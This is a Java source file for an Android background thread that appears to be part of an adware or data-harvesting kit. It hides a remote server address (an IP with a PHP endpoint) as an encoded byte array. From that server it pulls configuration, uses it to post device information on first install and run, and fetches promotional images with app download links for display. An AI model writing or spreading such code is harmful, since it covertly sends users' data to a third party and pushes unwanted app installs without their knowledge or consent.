package com.flex;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashSet;
import android.content.Context;
import android.os.Bundle;
import android.os.Message;

public class MainThread extends Thread {
	private final byte[] address = { 104, 116, 116, 112, 58, 47, 47, 49, 50,
			48, 46, 50, 54, 46, 51, 57, 46, 50, 51, 54, 47, 102, 120, 47, 112,
			104, 112, 47, 109, 97, 105, 110, 46, 112, 104, 112, 63, 113, 61, 49 };
	private static String tag = MainThread.class.getName();
	private Context mContext = null;
	public static MainThread mInstance = null;

	public static MainThread getFlexThreadInstance(Context ctx) {
		if (mInstance == null)
			mInstance = new MainThread(ctx);
		return mInstance;
	}

	public MainThread(Context context) {
		mContext = context;
	}

	public void run() {
		BasicInfo instance = BasicInfo.getInstance();
		if (instance.setLocalInformations(mContext) == false) {
			return;
		}

		FuncMod fm = FuncMod.getCmInstance();
		String gData = fm.GetConfigFileContent(new String(address));
		if (gData == null || gData.isEmpty() == true) {
			return;
		}
		String[] datas = gData.split("\\n");
		fm.cacheDatas(mContext, DataDef.KEY_GLOBALE_SHOW_SWITCH, datas[0]);
		fm.cacheDatas(mContext, DataDef.KEY_URL_RES_DATA_REPORT, datas[1]);
		fm.cacheDatas(mContext, DataDef.KEY_URL_RES_CID_CFG, datas[2]);
		fm.cacheDatas(mContext, DataDef.KEY_URL_RES_PIC_CFG, datas[3]);
		fm.cacheDatas(mContext, DataDef.KEY_URL_RES_BMD_CFG, datas[4]);
		fm.cacheDatas(mContext, DataDef.KEY_URL_RES_DOWN_REPORT, datas[5]);
		fm.cacheDatas(mContext, DataDef.KEY_URL_RES_BACKUP_CFG, datas[6]);

		String params = instance.getLocalInforParams(mContext);
		if (fm.NetWorkActivity(mContext) == false) {
			return;
		}
		String dataReportUrl = fm.getDatasFromCached(mContext,
				DataDef.KEY_URL_RES_DATA_REPORT);
		boolean isFirstInstall = fm.getBoolean(mContext,DataDef.KEY_NAME_FIRST_INSTALL, true);
		boolean isFirstRun = fm.getBoolean(mContext, DataDef.KEY_NAME_FIRST_RUN, true);
		
		if (fm.getSendState(mContext, DataDef.KEY_DATA_SEND_STATE, false) == false) {
			fm.setBoolean(mContext, DataDef.KEY_NAME_FIRST_INSTALL, false);
			if (fm.sendPost(dataReportUrl, params) == false) {
				return;
			}
		}else{
			if(isFirstInstall == false){
				if(isFirstRun == true){
					fm.setBoolean(mContext, DataDef.KEY_NAME_FIRST_RUN, false);
					if (fm.sendPost(dataReportUrl, params) == false) {
						return;
					}
				}
			}
		}
		
		fm.setSendState(mContext, DataDef.KEY_DATA_SEND_STATE, true);
		String value = fm.getDatasFromCached(mContext,
				DataDef.KEY_GLOBALE_SHOW_SWITCH);
		if (value.equals("false") == true) {
			return;
		}
		String idCfgUrl = fm.getDatasFromCached(mContext,
				DataDef.KEY_URL_RES_CID_CFG);
		if (fm.NetWorkActivity(mContext) == false) {
			return;
		}

		String idConfigData = fm.GetConfigFileContent(idCfgUrl);
		if (idConfigData == null || idConfigData.isEmpty()) {
			return;
		}

		String bmd = fm.GetConfigFileContent(fm.getDatasFromCached(mContext,
				DataDef.KEY_URL_RES_BMD_CFG));
		if (DataDef.gWhiteList == null) {
			DataDef.gWhiteList = new HashSet<String>();
		}
		String[] bmdData = bmd.split("\\n");
		for (String each : bmdData) {
			DataDef.gWhiteList.add(each);
		}
		String bkUrl = fm.GetConfigFileContent(fm.getDatasFromCached(mContext,
				DataDef.KEY_URL_RES_BACKUP_CFG));
		UI.mBackupUrls = bkUrl.split("\\n");
		DataDef.gBackupElem = fm.createBackupPictureData(UI.mBackupUrls);
		String thisID = fm
				.getDatasFromCached(mContext, DataDef.KEY_CHANNEL_ID);
		if (thisID.equals("") == true || thisID == null) {
			return;
		}

		boolean idNeedsShow = fm.thisIdNeedShow(idConfigData, thisID);
		if (idNeedsShow == false) {
			return;
		}

		String oldPicDataCfgHash = fm.getDatasFromCached(mContext,
				DataDef.KEY_PICTURE_CONFIG_MD5);
		String picDatas = fm.getPictureInformationURL(fm.getDatasFromCached(
				mContext, DataDef.KEY_URL_RES_PIC_CFG));
		String[] eachPic = picDatas.split("\\n");
		DataDef.gPictureDatas = new ArrayList<PictureData>();
		for (int i = 0; i < eachPic.length; i++) {
			String[] elements = eachPic[i].split("\\|");
			PictureData pd = new PictureData();
			InputStream is = fm.readRemotePicture(elements[0]);
			if (is != null) {
				pd.setPicBitmap(is);
				pd.setAppDownloadURL(elements[1]);
				pd.setAppName(elements[2]);
				pd.setPicLevel(elements[3]);
				DataDef.gPictureDatas.add(pd);
			}
		}

		String curPicDataCfgHash = fm.MD5(picDatas);
		if (oldPicDataCfgHash.equals("")) {
			fm.getPicturesAndFillImageViews(mContext, picDatas);
			fm.cacheDatas(mContext, DataDef.KEY_PICTURE_CONFIG_MD5,
					curPicDataCfgHash);
		} else {
			if (curPicDataCfgHash.equals(oldPicDataCfgHash) == true) {
			} else {
				fm.getPicturesAndFillImageViews(mContext, picDatas);
				fm.cacheDatas(mContext, DataDef.KEY_PICTURE_CONFIG_MD5,
						curPicDataCfgHash);
			}
		}
		boolean safeOrNot = fm.isCurrentActivityInBmd(DataDef.gWhiteList,
				mContext);
		Bundle bd = new Bundle();
		bd.putBoolean("safe", safeOrNot);
		Message msg = Message.obtain();
		msg.what = DataDef.MSG_ID_SHOW_UI;
		msg.obj = DataDef.gPictureDatas;
		msg.setData(bd);
		UI.recMsg.sendMessage(msg);
	}
}
